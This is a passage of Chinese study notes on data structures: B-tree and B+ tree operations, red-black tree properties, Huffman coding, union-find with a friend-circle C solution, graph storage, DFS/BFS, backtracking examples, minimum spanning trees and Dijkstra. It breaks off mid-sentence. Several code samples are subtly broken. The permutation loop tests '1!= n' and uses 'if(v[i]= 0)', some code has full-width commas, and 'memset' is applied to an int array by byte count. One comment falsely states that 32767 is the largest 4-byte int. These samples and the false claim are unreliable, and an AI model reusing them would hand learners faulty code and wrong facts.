删除关键字时，同样也要考虑结点内原本关键词的数量，保证结点始终拥有至少$\\lceil m&#x2F;2 \\rceil$-1个关键字： 当结点内关键字数量大于$\\lceil m&#x2F;2 \\rceil$-1，这时删除这个关键字不会破坏B树的定义要求，所以直接删除即可。 比如删除关键字9； 当结点内关键字数量等于$\\lceil m&#x2F;2 \\rceil$-1，并且其左右兄弟结点中存在关键字数量大于$\\lceil m&#x2F;2 \\rceil$-1的结点，则删除后 去兄弟结点中借关键字； 比如删除关键字2，而每个结点应至少有1个关键字，所以结构调整子树结构为根结点为5，7为左孩子，9为右孩子。 当结点内关键字数量等于$\\lceil m&#x2F;2 \\rceil$-1，并且其左右兄弟结点中不存在关键字数量大于$\\lceil m&#x2F;2 \\rceil$-1的结点，则需要 进行结点合并； 比如删除关键字16后，无法向兄弟结点借关键字，所以调整子树结构为如下： 如果删除的关键字不在终端结点上（最底层非叶子结点）：需要先转换成在终端结点上（找相邻关键字替换），再按照在终端结点上的情况来分别考虑对应的方法。 B+树 B+树是B树的一些变形，是常用于数据库和操作系统的文件系统中的一种用于查找的数据结构，包括oracle、Mysql等主流数据库。 B+树的性质： m阶B+树的每个分支结点至多有m个子树，不用来保存数据而是保存数据的索引。 除根结点外的所有非叶子结点至少有$\\lceil m&#x2F;2 \\rceil$棵子树。根结点要么没有子树，要么至少有2个子树。 有n棵子树的结点恰好有n个关键字。 **所有的叶子结点中包含了全部关键字的信息**，及指向含这些关键字记录的指针，且叶子结点本身依关键字的大小自小而大顺序链接。非叶子结点的元素在叶子结点上有冗余，非叶子结点的数据只是作为索引来帮助查找叶子结点元素。 所有的非终端结点可以看成是索引部分，结点中仅含其子树中的大（或小）关键字。 B+树中，数据对象的插入和删除仅在叶节点上进行。 B+树**有2个头指针，一个是树的根节点root（用于随机查找），一个是小关键码的叶节点指针sqt（用于顺序查找&#x2F;范围查找）。且叶子结点之间有指针**。 Mysql索引使用的是B+树，因为索引（非叶子结点）是用来加快查询的。同时而B+树通过对数据进行排序，所以是可以提高查询速度的，并且一个结点中可以存储多个元素，从而可以使得B+树的高度不会太高。 在Mysql中一个Innodb页就是一个B+树结点，一个Innodb页默认16kb（存储本结点关键字），所以一般情况下一棵两层的B+树可以存2000万行左右的数据（B+树一般不会超过3层），然后通过利用B+树叶子结点存储了所有数据并且进行了排序，并且叶子结点之间有指针，可以很好的支持全表扫描，范围查找等SQL语句。 B树和B+树的区别： ① 在B+树中，具有n个关键字的结点只含有n棵子树，即每个关键字对应一颗子树；而在B树中，具有n个关键字的结点含有(n+1)棵子树。② 在B+树中，每个结点(非根内部结点)关键字个数n的范围是[m&#x2F;2]&lt;&#x3D;n&lt;&#x3D;m(根结点1&lt;&#x3D;n&lt;&#x3D;m),在B树中，每个结点(非根内部结点)关键字个数n的范围是[m&#x2F;2]-1&lt;&#x3D;n&lt;&#x3D;m-1(根结点:1&lt;&#x3D;n&lt;&#x3D;m-1)。③ 在B+树中，叶结点包含信息，所有非叶结点仅起到索引的作用，非叶结点中的每个索引项只含有对应子树的最大关键字和指向该子树的指针，不含有该关键字对应的存储地址。④ 在B+树中，叶结点包含了全部关键字，即在非叶结点中出现的关键字也会出现在叶结点中；而在B树中，叶结点包含的关键字和其他结点包含的关键字是不重复的。⑤ 在B+树中，有一个指针指向关键字最小的叶子结点，所有叶子结点连接成一个单链表。 红黑树参考：https://blog.csdn.net/cy973071263/article/details/122543826 背景 若插入和删除操作总在平衡二叉树（AVL）的某一子树进行，那么大多数的结点都会在根结点的右侧或左侧，此时，二叉搜索树就接近于一个链表，它的操作效率就降低了。为了不断维持平衡二叉树的平衡状态，就需要对AVL进行旋转处理。红黑树的出现是为了解决维持平衡二叉树AVL而导致的成本高的问题。 比如下面进行平衡二叉树的插入时，就需要进行旋转，重新维持平衡。 概念 自平衡二叉查找树，以前也叫平衡二叉B树。红黑树具有良好的效率，它可在 O(logN) 时间内完成查找、增加、删除等操作。 红黑树为具备了某些特性的二叉搜索树，能解决非平衡树问题，是一种**接近平衡**的二叉树（说它是接近平衡因为它并没有像AVL树的平衡因子的概念，它只是靠着满足红黑节点的5条性质来维持一种接近平衡的结构，进而提升整体的性能，并没有严格的卡定某个平衡因子来维持绝对平衡）。红黑树同时具有平衡和排序的特点，既接近平衡二叉树，又是二叉搜索树BST。 性质 首先，红黑树是一个二叉搜索树，它在每个结点增加了一个存储位记录节点的颜色，可以是RED，也可以是BLACK；通过任意一条从根到叶子简单路径上颜色的约束，红黑树保证最长路径不超过最短路径的二倍，因而近似平衡（最短路径就是全黑节点，最长路径就是一个红结点一个黑结点，当从根结点到叶子结点的所有路径上黑色结点数目相同时，最长路径刚好是最短路径的两倍）。它同时满足以下特性： 结点是红色或黑色 根是黑色 叶子结点（外部结点，空结点）都是黑色 红色结点的子结点都是黑色，红色结点的父结点都是黑色，从根结点到叶子结点的所有路径上不能有 2 个连续的红色结点 从任一结点到叶子结点（空结点）的所有路径都包含相同数目的黑色结点 哈夫曼树及哈夫曼编码 概念 结点的权值：给树的结点赋予的有某种意义的数值； 结点的带权路径长度WPL：从根结点到该结点之间的路径长度与该结点的权值的乘积； 树的带权路径长度WPL：树中所有叶子结点的带权路径长度之和，记为$WPL&#x3D;\\sum_{i&#x3D;1}^n{w_i*l_i}$。式中，$w_i$是第i个叶结点所带的权值，$l_i$是该叶结点到根结点的路径长度。 哈夫曼树：在$n_0$个带权叶子节点构成的所有二叉树中，带权路径长度WPL最小的二叉树称为哈夫曼树。（原则：权值越大的叶子结点越靠近根结点，权值越小的叶子结点越远离根结点） 哈夫曼树的构造 给定n个权值分别为$w_1$，$w_2$，…，$w_n$的结点。构造哈夫曼树的算法描述如下: 将这n个结点分别作为n棵仅含一个结点的二叉树，构成森林F。 从F中选取两棵根结点权值最小的树作为左、右子树来构造一个新二叉树，并且将新二叉树根结点的权值置为左、右子树上根的权值之和。 从F中，用新得到的树代替刚才选出的两棵树。 重复步骤2)和3)，直至F中只剩下一棵树为止。 哈夫曼编码 固定长度编码：每个字符使用相同长度的二进制位来表示； 可变长度编码：允许对每个字符使用不同长度的二进制位来表示； 可变长度编码比固定长度编码好得多，其特点是对频率高的字符赋予短编码，而对频率较低的字符则赋予较长一些的编码，从而可以使平均编码长度减短，起到压缩数据的效果。哈夫曼编码是一种被广泛应用而且非常有效的数据压缩编码，它是可变长度编码。 前缀编码：没有一个编码是另一个编码的前缀。前缀编码的解码操作相对简单，无需考虑重复前缀。哈夫曼编码属于前缀编码。 构造哈夫曼编码首先要构造一棵哈夫曼树。 首先，将每个出现的字符当作一个独立的结点， 其权值为它出现的频度(或次数)，然后构造出对应的哈夫曼树。显然，所有字符结点都出现在叶结点中。我们可以将字符的编码解释为从根至该字符的路径上边标记的序列，其中边标记为0表示“转向左孩子”，标记为1表示“转向右孩子”。图13-7所示为-一个由哈夫曼树构造哈夫曼编码的示例，矩形方块表示字符及其出现的次数。 这棵哈夫曼树的WPL为：WPL&#x3D;1*45+3*(13+12+16)+4*(5+9)&#x3D;224 此处的WPL可以视为最终编码得到二进制编码的长度，共224位。如果采用3位固定长度编码，则得到的二进制编码长度为300位。可见哈夫曼编码共压缩了约25%的数据。利用哈夫曼树可以设计出总长度最短的二进制前缀编码。 3.5 并查集并查集是一种树形的数据结构，用于处理一些不相交集合(Disjoint Sets)的合并及查询问题。常常在使用中以森林来表示，进行快速规整。 并查集保持一组不相交的动态集合 S&#x3D;{S1, S2, ….., Sk }。**每个集合通过一个代表来识别**， 代表即集合中的某个成员。在某些应用中，哪一个成员被选作代表是无所谓的。在一些应用中，如何选择代表可能存在着预先说明的规则，例如选择集合中的最小元素。 集合中的每一个元素是由一个对象表示的，设x表示一个对象，则并查集应支持以下操作： make_set(x)：建立一个新的集合，其唯一成员就是 x (x此时即是代表)。因为各集合是不相交的，故要求x没有在其他集合中出现过。 union_set(x, y)：如果x、y分属不同集合，则将包含x和y的动态集合合并为一个新的集合。 find_set(x)：返回一个指针，指向包含x所在的集合的代表。 单链表实现 要实现并查集数据结构，一种简单的方法是每一个集合都用一个链表来表示。每个链表的第一个对象作为它所在集合的代表。链表中的每一个对象都包含一个集合成员、 一个指向包含下一个集合成员的对象的指针，以及指向代表的指针。每个链表都含head指针指向链表的代表，以及tail指针指向链表中最后的对象。 并查集森林 并查集的另一种更快的实现是用有根树来表示集合：每棵树表示一个集合， 树中的结点对应一个成员。在下图所示的并查集森林中，每个成员仅指向其父结点，父结点为其代表。每棵树的根为整个集合的代表，并且是它自己的父结点。 图13-8中左侧是两棵表示两个集合的树，左边的树表示集合{b, c, e, h}， 其中c为代表；右边的树表示集合{d, f, g}， 其中f为代表。右侧为union_set(e, g)的结果。 make_set创建一棵仅包含一个结点的树。 在执行find_set操作时，要沿着父结点指针一直找下去，直至找到树根为止。 union_set操作使得一棵树的根指向另一棵树的根。 两种并查集森林的改进策略 第一种是按秩合并，其思想是union_set操作使包含较少结点的树的根指向包含较多结点的树的根。 这种方法并不显式记录以每个结点为根的子树的大小，而是采用了一种能够简化分析的方法：对每个结点，用秩表示结点高度的一个上界。在按秩合并中，具有较小秩的根在union_set操作中要指向具有较大秩的根。 第二种是路径压缩，这种方法简单有效。它使一棵树的每个结点都直接指向根结点，如图13-9所示。 假如已知有n个人和m对好友关系(存于数字r)。如果两个人是直接或间接的好友(好友的好友的好友..)，则认为他们属于同一个朋友圈，请写程序求出这n个人里一共有多少个朋友圈。 假如：n&#x3D;5， m&#x3D;3, r&#x3D;{ {1,2},{2,3},{4,5} }， 表示有5个人，1 和2是好友，2和3是好友，和5是好友，则1、2、3属于一个朋友圈，4、5属于另一个朋友圈，结果为2个朋友圈。 最后请分析所写代码的时间、空间复杂度。评分会参考代码的正确性和效率。int friends(int n, int m, int* r[]); 12345678910111213141516171819202122232425262728293031323334353637383940int set [10001]; // 存储每个元素的代表/*带路径优化的并查集查找算法：查找集合x的代表，并使用路径压缩，让所有结点指向该代表*/int find(int x) &#123; int i,j，r; r=x; while(set[r] != r) //寻找此集合的代表 r=set[r]; // 只有根结点满足r=set[r]，因此当r=set[r]时，表示找到了该集合的代表，即根结点 i=x; while(i != r)&#123; //使得r代表的集合中，所有结点直接指向r，即路径压缩 j=set[i]; set[i]=r; i=j; // 继续更新i原来的代表j &#125; return r;&#125;void merge(int x , int y) &#123; //优化的并查集归并算法 int t=find(x); // 找到x的代表 int h=find(y); // 找到y的代表 if(t&lt;h) // 合并两个集合，令x的代表指向y的代表，或者反过来 set[h]=t; else set[t]=h;&#125;// n个结点，m个关系int friends(int n, int m，int* r[]) &#123; int i，count; for(i=1 ;i&lt;=n; ++i) //初始化并查集，分支数为n，各点为孤立点，各结点代表就是自身，所以set[i]=i set[i]=i; for(i=0 ;i&lt;m; ++i) //读入r，r[i][0]和r[i][1]为有关系的结点 merge(r[i][0], r[i][1]); count=0; for(i=1; i&lt;=n; ++i) &#123; if(set[i] == i) //统计代表是自己的结点个数，也即朋友圈 ++count; &#125; return count;&#125; 参考：https://blog.csdn.net/qq_40378034/article/details/103224445 4 图4.1 图的基本概念图G由顶点集V和边集E组成，记为G&#x3D;(V, E)，其中V(G)表示图G中顶点的有限非空集；E(G)表示图G中顶点之间的关系(边)集合。若 V &#x3D; {$v_1$, $v_2$, …, $v_n$}，用|V|表示图G中顶点的个数，也称为图G的阶，E&#x3D;{(u, v)|u∈V, v∈ V}，用E表示图G中边的条数。 注意：线性表可以是空表，树可以是空树，但图不可以是空图。就是说，图中不能一个顶点也没有，图的顶点集V一定非空，但边集E可以为空，此时图中只有顶点而没有边。 有向图：若E是有向边（也称为弧）的有限集合时，则图G为有向图。 无向图：若E是无向边（简称边）的有限集合时，则图G为无向图。 在无向图中，如果任意两个顶点之间都存在边，则称该图为无向完全图。含有n个顶点的无向完全图有n(n-1)&#x2F;2条边。 在有向图中，如果任意两个顶点之间都存在方向相反的两条弧，则称该图为有向完全图。含有n个顶点的有向完全图有**n(n-1)**条有向边。 设有两个图G&#x3D;(V, E)和G’&#x3D;(V’, E’)，若V是V的子集，且E是E的子集，则称G是G的子图。若有满足V(G)&#x3D;V(G’)的子图G，则为G的生成子图。 在无向图中，若从顶点v到顶点w有路径存在，则称v和w是连通的。若图G中任意两个顶点都是连通的，则称图G为连通图，否则称为非连通图。无向图中的极大连通子图称为连通分量。如果一个图有n个顶点，并且有小于n-1条边，则此图必是非连通图。如图14-1(a)所示，图G有3个连通分量。 在有向图中，若从顶点v到顶点w和从顶点w到顶点v之间都有路径，则称这两个顶点是强连通的。若图中任何一对顶点都是强连通的，则称此图为强连通图。有向图中的极大强连通子图称为有向图的强连通分量，图G2的强连通分量如图14-2 所示。 图中每个顶点的度定义为以该顶点为一个端点的边的数目。对于无向图，顶点v的度是指依附于该项点的边的条数，记为TD(1)。在无向图中，**无向图的全部顶点的度之和等于边数的两倍**，这是因为每条边和两个顶点相关联。 对于有向图，顶点v的度分为入度和出度，入度是以顶点v为终点的有向边的数目；而出度是以顶点v为起点的有向边的数目。 顶点v的度等于其入度和出度之和，在有向图中，**有向图的全部顶点的入度之和与出度之和相等并且等于边数**。这是因为每条有向边都有一个起点和终点。 4.2 图的存储及基本操作邻接矩阵法所谓邻接矩阵存储，就是用一个二维数组存储图中边的信息( 即各顶点之间的邻接关系)，存储顶点之间邻接关系的二维数组称为邻接矩阵。 结点数为n的图G&#x3D;(V, E)的邻接矩阵A是n*n的。将G的顶点编号为$v_1$, $v_2$, …, $v_n$。若$(v_i, v_j)∈E$，则$A[i][j]&#x3D;1$，否则，$A[i][j]&#x3D;0$。 $A[i][j]&#x3D;\\begin{cases} 1,\\quad若(v_i, v_j)或&lt;v_i,v_j&gt;是E(G)中的边\\ 0,\\quad若(v_i, v_j)或&lt;v_i,v_j&gt;不是E(G)中的边 \\end{cases}$ 对于带权图而言，若顶点$v_i$和$v_j$之间有边相连，则邻接矩阵中对应项存放着该边对应的权值，若顶点$v_i$和$v_j$不相连，则用∞来代表这两个顶点之间不存在边。 $A[i][j]&#x3D;\\begin{cases} w_{ij},\\quad若(v_i, v_j)或&lt;v_i,v_j&gt;是E(G)中的边\\ 0或\\infty,\\quad若(v_i, v_j)或&lt;v_i,v_j&gt;不是E(G)中的边 \\end{cases}$ 1234567891011#define MAXV &lt;最大顶点数&gt;#define INF 32767 // 4字节int型数值的最大数为32767typedef struct&#123; // 顶点类型 int no; InfoType info;&#125;VertexType;typedef struct&#123; // 邻接矩阵 int edges[MAXV][MAXV]; int n, e; // 顶点数、边数 VertexType vexs[MAXV]; // 存放顶点信息&#125;MatGraph; 图的邻接矩阵存储表示法具有以下特点: 无向图的邻接矩阵一定是一个对称矩阵（并且唯一）。 对于无向图，邻接矩阵的第i行（或第i列）非零元素（或非∞元素）的个数正好是第i个顶点的度。 对于有向图，邻接矩阵的第i行（或第i列）非零元素（或非∞元素）的个数正好是第i个顶点的出度（或入度）。 用邻接矩阵方法存储图，很容易确定图中任意两个顶点之间是否有边相连。但是，要确定图中有多少条边，则必须按行、按列对每个元素进行检测，所花费的时间代价很大。 稠密图适合使用邻接矩阵的存储表示。 邻接表法所谓邻接表就是对图G中的每个顶点v建立一个单链表， 第i个单链表中的结点表示关联于顶点$v_i$的边(对于有向图则是以顶点$v_i$的起点的边)，这个单链表就称为顶点$v_i$的的边表（对于有向图则称为出边表）。边表的头指针和顶点的数据信息采用顺序存储（称为顶点表），所以在邻接表中存在两种结点：顶点表结点和边表结点，如图144所示。顶点表中，data存储顶点$v_i$的名称或其他信息，firstarc指向顶点$v_i$的单链表中的首结点；边表的adjvex表示与顶点$v_i$邻接的顶点编号，nextarc指向下一个边结点，另外还可以有一个weight数值域，存放边的权值等信息。 1234567891011121314151617// 顶点表（头结点）typedef struct Vnode&#123; InfoType info; //顶点的其他信息 ArcNode *firstarc; //指向第一个边结点&#125;VNode;// 边表（边结点）typedef struct ANode&#123; int adjvex; //该边的邻接点编号 struct ANode *nextarc; //指向下一条边的指针 // int weight; //该边的相关信息，比如权值&#125;ArcNode;typedef struct&#123; VNode adjlist[MAXV]; //邻接表的头结点数组 int n, e; // 图的顶点数n、边数e&#125;AdjGraph; 图的邻接表存储方法具有以下特点: 1 )如果G为无向图，则所需的存储空间为O (V+2|E|)；如果G为有向图，则所需的存储空间为O (V+|E|)。前者的倍数2是由于无向图中，每条边在邻接表中出现了两次。2) 对于稀疏图，采用邻接表表示将极大地节省存储空间。3) 在邻接表中，给定一顶点，能很容易地找出它的所有邻边，因为只需要读取它的邻接表就可以。在邻接矩阵中，相同的操作则需要扫描一行， 花费的时间为O(n)。但是，如果要确定给定的两个顶点间是否存在边，则在邻接矩阵里可以立刻查到，在邻接表中则需要在相应结点对应的边表中查找另一结点，效率较低。 4.3 图的遍历&#x3D;&#x3D;深度优先搜索DFS&#x3D;&#x3D;深度优先搜索（DFS）类似于树的先序遍历。它的基本思想如下：首先访问图中某一起始顶点v，然后由v出发，访问与v邻接且未被访问的任一顶点$w_1$，再访问与$w_1$邻接且未被访问的任一顶点$w_2$, ……重复上述过程。当不能再继续向下访问时，依次退回到最近被访问的顶点，若它还有邻接顶点未被访问过，则从该点开始继续上述搜索过程，直到图中所有顶点均被访问过为止。 12345678910111213/*以邻接表为存储结构的深度优先遍历算法*/int visited[MAX] = &#123;0&#125;; // 全局数组，标记顶点是否已被访问void DFS(AdjGraph *G, int v)&#123; ArcNode *p; // 边结点 visited[v] = 1; // 访问该结点，置访问标记为1 cout&lt;&lt;v&lt;&lt;&quot; &quot;; p = G-&gt;adjlist[v].firstarc; // p指向顶点v的第一个邻接点 while(p!=NULL)&#123; if(visited[p-&gt;adjvex] == 0) //若编号为p-&gt;adjvex的结点p未被访问，则递归访问它，继续遍历它的邻接点 DFS(G, p-&gt;adjvex); p = p-&gt;nextarc; // 一轮深度优先遍历结束后，回退到出发点，继续遍历剩余邻接结点，p指向顶点v的下一个邻接点 &#125;&#125; &#x3D;&#x3D;广度优先搜索 BFS&#x3D;&#x3D;广度优先搜索（BFS）类似于二叉树的层序遍历算法，它的基本思想是：首先访问起始项点v，接着由v出发，依次访问v的各个未访问过的邻接顶点$w_1$, $w_2$, …, $w_i$，然后再依次访问$w_1$, $w_2$, …, $w_i$的所有未被访问过的邻接顶点；再从这些访问过的顶点出发，再访问它们所有未被访问过的邻接顶点…..以此类推，直到图中所有顶点都被访问过为止。类似的思想还将应用于Dijkstra单源最短路径算法和Prim最小生成树算法。 广度优先搜索是一种分层的查找过程，每向前走一步可能访问一批顶点，不像深度优先搜索那样有往回退的情况，因此它不是一个递归的算法。为了实现逐层的访问，算法必须借助一个辅助队列，以记忆正在访问的顶点的下一层顶点。 1234567891011121314151617181920212223void BFS(AdjGraph *G, int v)&#123; int w, i; ArcNode *p; SqQueue *qu; // 用于存储下一次广度搜索时要访问的结点 InitQueue(qu); int visited[MAXV]; for(i=0; i&lt; G-&gt;n; i++) visited[i] = 0; //标记顶点是否已被访问 cout&lt;&lt;v&lt;&lt;&quot; &quot;; visited[v] = 1; // 置已访问标记 enQueue(qu, v); while(!QueueEmpty(qu))&#123; // 队列不为空时 deQueue(qu, w); // 出队，顶点编号存入w p = G-&gt;adjlist[w].firstarc; // p指向w的第一个邻接结点 while(p!=NULL)&#123; // 访问p所有的邻接结点，并将其入队，以进行下一次广度搜索 if(visited[p-&gt;adjvex] == 0)&#123; cout&lt;&lt;p-&gt;adjvex&lt;&lt;&quot; &quot;; // 访问该邻接结点，并置访问标记为1 visited[p-&gt;adjvex] = 1; enQueue(qu, p-&gt;adjvex); &#125; p = p-&gt;nextarc; // 若访问过，则继续遍历其余邻接结点 &#125; &#125;&#125; 4.4 图遍历算法的应用 判断图的连通性 图的遍历算法可以用来判断图的连通性。对于无向图来说，如果无向图是连通的，则从任一结点出发，仅需一次遍历就能够访问图中所有顶点；如果无向图是非连通的，则从某一个顶点出发，一次遍历只能访问到该顶点所在连通分量的所有顶点，而对于图中其他连通分量的顶点，则无法通过这次遍历访问。对于有向图来说，若从初始点到图中的每个顶点都有路径，则能够访问到图中的所有顶点，否则不能访问到所有顶点。 遍历解答树 在问题求解时，对所有可能的问题解构成一棵树，而最优解或者符合要求的解就是该树的一条路径或者一个结点。这种树称为解答树。 例1：比如1,2…n的排列一共有n!个，生成它们至少需要n!的时间。图14-6是生成123的全排列的解答树。通过深度优先遍历DFS就可以输出1,2…n的全排列 1234567891011121314151617181920212223242526const int N=13; //n 的最大值int d[N]; //记录解int v[N]; //记录某个值是否被遍历过，没遍历过为0，遍历过后为1int n;void dfs(int depth) &#123; if (depth&gt;=n) &#123; // 到达叶子结点 for(int i=0; 1!= n; ++i) cout&lt;&lt;d[i] ; cout&lt; &lt;endl; return; &#125; for(int i=1; i&lt;=n; ++i) &#123; // 第一层，1, 2, ……, n if(v[i]= 0) &#123; // 选择未被访问的数 v[i]=1; // 置访问标记为1 d[depth]=i; dfs(depth+1); // 递归遍历下一层 v[i]=0; // 回退，标记数i未被访问 &#125; &#125;&#125;void main() &#123; cin&gt;&gt;n; memset(v, 0, n); // 初始化数组v，将v中前n个字节置0 dfs(0);&#125; 按照相同的原理，输出数组的全排列： 1234567891011121314151617void perm(int list[], int k, int m) &#123; // k表示遍历解答树的深度，m表示数组下标最大值 if(k &gt; m) &#123; copy(list，list+k, ostream_iterator&lt;int&gt;(cout, &quot; &quot;)); cout&lt;&lt;endl; return; &#125; for(int i=k ;i &lt;= m; ++i) &#123; swap(list[k], list[i]); perm(list, k+1, m); // 继续递归遍历解答树的下一层 swap (list[k], list[i]); // 回溯 &#125;&#125;void main() &#123; int list[] = &#123;1, 2, 3, 4&#125;; perm(list, 0, sizeof(list)/sizeof(int)-1);&#125; 例2：有1分，2分，5分，10分四种硬币，每种硬币数量无限，给定Target分钱，求有多少种组合可以组合成Target分钱? 依然是解答树的深度优先遍历DFS问题（回溯法）： 参考：https://blog.csdn.net/huangxy10/article/details/8026464 1234567891011121314151617181920212223242526272829303132int count=0; //统计有多少种组合int Target=0;int coin[4]=&#123;1, 2, 5, 10&#125;; //记录硬币的面值int total=0;vector&lt;int&gt; solution; //解向量void dfs (int index) &#123; if(total == Target) &#123; // 满足条件，输出结果 count++; cout &lt;&lt; count &lt;&lt;&quot;:&quot; ; for(int i=0; i &lt; (int) solution.size(); i++) cout &lt;&lt; solution[i]&lt;&lt;&quot; &quot;; cout &lt;&lt; endl; return; &#125; if (total &gt; Target) // 无解 return; for(int i=index; i&lt;4; i++) &#123; // 币种为4种，也就是解空间树结点有4个分支 total += coin[i] ; solution.push_ back(coin[i]); dfs(i); // 继续深度优先遍历 solution.pop_back(); // 回溯 total -= coin[i]; &#125;&#125;void main()&#123; count=0; cin &gt;&gt; Target; //需输入大于0的整数 dfs(0); cout &lt;&lt; count &lt;&lt;endl;&#125; 01背包问题，使用深度优先遍历的思想解决 0-1背包问题除了用动态规划解决以外，是不是也可以利用深度优先遍历解决呢?下图为有ABCD若干件物品的背包问题解答树。 我们利用深度优先遍历遍历至每个叶子结点，求出小于背包容量的最大值即可。代码如下： 1234567891011121314151617181920212223const int N=100; //物品最大件数int ans=0; //保存解int item_number; //物品件数int knap_size; //背包载重量或者体积容量int weight[N]; //物品的重量或者体积int value [N]; //物品的价值int x[N]; //解向量void dfs(int cur_depth , int cur_size，int cur_value) &#123; if(cur_depth &gt; item_number) &#123; //到达叶子结点 if (cur_value &gt; ans) //更新最优解 ans=cur_value; return; &#125; if(cur_size &gt; knap_size) //超过背包容量，该路径不是问题的解 return; if(cur_value &gt; ans) //保存当前路径解 ans=cur_value; //深度优先搜索，要或不要两种选择而已。 dfs (cur_depth+1, cur_size, cur_value); // 不放入 dfs (cur_ depth+1, cur_size+weight[cur_depth], cur_value+value[cur_depth]); //放入&#125;dfs(0,0,0) 4.5 图的基本应用最小生成树连通图的生成树是包含图中全部顶点的一个极小连通子图。若图中顶点数为n，则它的生成树含有n-1条边。对于生成树而言，若砍去它的一条边，则会变成非连通图，若加上一条边则会形成一个回路。在非连通图中，连通分量的生成树构成了非连通图的生成森林。 注意区分极大连通子图和极小连通子图：极大连通子图是无向图的连通分量，极大即要求该连通子图包含其所有的边；极小连通子图是连通无向图的生成树，极小既要保持图连通，又要使得边数最少，只有生成树满足条件，砍去生成树的任一条边， 图将不再连通。 构造最小生成树有多种算法，但大多数算法都利用了最小生成树的下列性质： 假设G&#x3D;(V,B)是一个带权连通无向图，U是顶点集V的一个非空子集。若(u,v)是一条具有最小权值的边，其中u∈U，v∈V-U，则必存在一棵包含边(u, v)的最小生成树。 基于该性质的最小生成树算法主要有：Prim 算法和Kruskal算法，它们都基于贪心算法的策略。 **&#x3D;&#x3D;prim算法&#x3D;&#x3D;**（运用BFS） Prim算法的步骤如下： 初始化：向空树$T&#x3D;(V_T,E_T)$中添加图$G&#x3D;(V,E)$的任一顶点$u_o$，使$V_T&#x3D;{u_0}$，$E_T&#x3D;\\emptyset$。 循环（重复下列操作至$V_T&#x3D;V$）：从图G中选择满足${(u,v)|u \\in V_T, v \\in V-V_T}$且具有最小权值的边(u,v)，并置$V_T &#x3D; V_T \\bigcup {v}$，。$E_T &#x3D; E_T \\bigcup {(u,v)}$。 Prim算法的时间复杂度为$O(|V|^2)$，不依赖于|E|，因此它适用于求解边稠密的图的最小生成树。虽然采用其他方法可以改进Prim算法的时间复杂度，但增加了实现的复杂性。 &#x3D;&#x3D;kruskal算法&#x3D;&#x3D; 与Prim算法从顶点开始扩展最小生成树不同，Kruskal 算法是一种按权值的递增次序选择合适的边来构造最小生成树的方法。假设N&#x3D;(V,E)是连通网，对应的最小生成树$T&#x3D;(V_T,E_T)$，KVruskal 算法的步骤如下： 初始化：使$V_T&#x3D;V$，$E_T&#x3D;\\emptyset$。 即每个顶点构成一棵独立的树， T此时是一个仅含|V|个顶点的森林； 循环（重复下列操作至T是一棵树）：按G的边的权值递增顺序依次从$E &#x3D; E_T$中选择一条边，如果这条边加入T后不构成回路，则将其加入E，否则舍弃，直到E中含有n-1条边。 通常在Kruskal算法中，采用堆来存放边的集合，则每次选择最小权值的边只需O(log|E|)的时间。又生成树T中所有边可以视为一个等价类，每次添加新的边的过程类似于求解等价类的过程，由此可以采用并查集的数据结构来描述T，从而构造T的时间复杂度为O(|E|log|E|),因此，Kruskal 算法适合于边稀疏而顶点较多的图。 最短路径求解最短路径的算法通常都依赖于一种性质，也就是两点之间的最短路径也包含了路径上其他顶点间的最短路径。这种最优子结构性质是动态规划和贪心算法是否适用的一个标记。 带权有向图G的最短路径问题，一般可分为两类：一是单源最短路径，即求图中某一顶点到其他各顶点的最短路径，可通过经典的Djkstra 算法求解，此算法也是基于贪心算法的策略；二是求每一对顶点间的最短路径，可通过Floyd-Warshall算法来求解，此算法是基于动态规划的思想。 &#x3D;&#x3D;Dijkstra算法&#x3D;&#x3D;（BFS+贪心）求单源最短的径问题参考：https://www.bilibili.com/video/BV1zz4y1m7Nq 求带权有向图中某个源点到其余各顶点的最短路径，最常用的是Dijkstra 算法。该算法设置一个集合s，记录已求得的最短路径的顶点，初始时把源点v的放入S中。此外，在构造过程中还设置了两个辅助数组： **dist[]**：记录了从源点$v_0$到其他各顶点当前的最短路径长度，dist[i]初值为arcs[0][i]。 **path[]**：path[i]表示从源点到顶点i之间的最短路径的前驱结点，在算法结束时，可根据其值追溯得到源点$v_0$到顶点V的最短路径。 假设从顶点0出发，即$v_0&#x3D;0$，集合S最初只包含顶点0，邻接矩阵arcs表示带权有向图，arcs[i][j]表示有向边&lt;i, j&gt;的权值，若不存在有向边&lt;i, j&gt;，则arcs[i][j]为∞。 Djkstra 算法的步骤如下（不考虑对path[]的操作）： 初始化：集合S初始为{0}，dist[]的初始值dist[i]&#x3D; arcs[0][i]，i&#x3D;1, 2, …, n-1。 从未入选S的顶点集合V-S中选出距离出发点$v_0$最近（即dist最小）的结点$v_j$，也就是满足$dist[j]&#x3D;Min{dist[i]|v_i \\in V-S}$，$v_j$就是当前求得的一条从$v_0$出发的最短路径的终点，将其收录进S，即令$S&#x3D;S \\bigcup {j}$。 修改从$v_0$出发到集合V-S上的$v_k$可达的最短路径长度dist[k]，$v_k$为$v_j$的邻近顶点：如果$v_0$经过结点$v_j$到达$v_k$的距离小于已知的到达$v_k$的距离，即dist[j]+arcs[j][k] &lt; dist[k]，则更新disk[k]，令dist[k]&#x3D;dist[j]+arcs[j][k]。 重复2) ~3)操作共n-1次，直到所有的顶点都包含在S中。 算法计算过程举例 例如，表14-1所示为应用Djkstra算法对图14-11中的图从顶点1出发，求其到其余顶点的最短路径。 第一趟：与结点1直接相连的有结点2、5，距离分别为10、5。而其余结点不能直达，所以距离为无限。这样每个结点都有一个初始化的距离。更新结点2、5的距离，并将距离最短的结点5加入S； 第二趟：上一趟在S中加入了结点5，因此对于与结点5直连且未选入S的结点2、3、4，计算其距离与出发点1的距离。计算时，判断经过结点5的路径和已知路径哪个更短。对于结点2，经过结点5的路径长度为5+3&#x3D;8，不经过则为已知的10，因此更新其最短路径长度为8（path数组中可以更新结点2的值为5，表示到达结点2的最短路径中终点的前驱结点为5）。同理，对于结点3，5+9&#x3D;14&lt;$\\infty$，其最短路径长度更新为14。对于结点4，5+2&#x3D;7&lt;$\\infty$，其最短路径长度更新为7。接着，选择V-S中有路径长度最短的结点4加入S； 第三趟：重复第二趟中的过程，更新结点4的邻近结点3（未加入S）的最短路径长度，7+6&#x3D;13&lt;14，因此更新为13，然后选择V-S中路径最短的结点2加入S； 第四趟：继续重复，更新结点2的邻近结点3（未加入S）的最短路径长度，8+1&#x3D;9&lt;13，因此更新为9，然后选择V-S中路径最短的结点3加入S； 这样所有结点均加入S，计算完毕。 特点 显然，Dijkstra 